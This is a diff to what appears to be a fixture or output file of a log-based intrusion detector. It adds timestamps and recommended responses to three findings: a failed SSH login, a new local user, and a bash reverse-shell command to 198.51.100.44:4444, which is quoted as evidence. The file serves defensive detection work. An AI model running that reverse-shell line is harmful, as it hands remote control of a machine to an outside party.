@@ -3,18 +3,24 @@
     "rule_id": "failed-login",
     "description": "Repeated failed SSH authentication attempt",
     "severity": "medium",
-    "evidence": "May 18 09:00:01 kiosk sshd[1201]: Failed password for invalid user admin from 198.51.100.12 port 51222 ssh2"
+    "evidence": "May 18 09:00:01 kiosk sshd[1201]: Failed password for invalid user admin from 198.51.100.12 port 51222 ssh2",
+    "timestamp": "May 18 09:00:01",
+    "recommended_action": "Review source IP history, rate-limit SSH, and confirm no successful login followed."
   },
   {
     "rule_id": "suspicious-command",
     "description": "Suspicious shell command execution pattern",
     "severity": "high",
-    "evidence": "May 18 09:02:44 kiosk bash[1304]: bash -i >& /dev/tcp/198.51.100.44/4444 0>&1"
+    "evidence": "May 18 09:02:44 kiosk bash[1304]: bash -i >& /dev/tcp/198.51.100.44/4444 0>&1",
+    "timestamp": "May 18 09:02:44",
+    "recommended_action": "Preserve process context, isolate the host if unauthorized, and review shell history."
   },
   {
     "rule_id": "new-user",
     "description": "New local user was created",
     "severity": "high",
-    "evidence": "May 18 09:03:10 kiosk useradd[1310]: new user: name=tempadmin, UID=1002, GID=1002, home=/home/tempadmin"
+    "evidence": "May 18 09:03:10 kiosk useradd[1310]: new user: name=tempadmin, UID=1002, GID=1002, home=/home/tempadmin",
+    "timestamp": "May 18 09:03:10",
+    "recommended_action": "Confirm the account creation was approved and disable the user if suspicious."
   }
 ]
